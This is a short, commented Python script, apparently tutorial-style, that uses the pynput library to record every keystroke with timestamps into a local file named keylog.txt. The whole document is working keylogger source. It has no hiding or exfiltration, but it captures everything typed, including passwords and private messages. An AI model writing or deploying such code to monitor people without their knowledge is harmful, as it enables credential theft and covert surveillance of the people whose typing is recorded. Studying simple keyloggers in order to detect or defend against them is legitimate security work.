# Import keyboard event listner from pynput library
from pynput.keyboard import Listener
# Import python internal logging library
import logging


# Setup format and file logging the keys into
logging.basicConfig(filename=("keylog.txt"), level=logging.DEBUG, format=" %(asctime)s - %(message)s")
 
# Function to run each time a key is pressed (Log to file)
def on_press(key):
    logging.info(str(key))
 
print("Keylogger started and listening. Saving to keylog.txt")

# Start listner with the callback function we defined above
with Listener(on_press=on_press) as listener :
    listener.join() # Start the listener
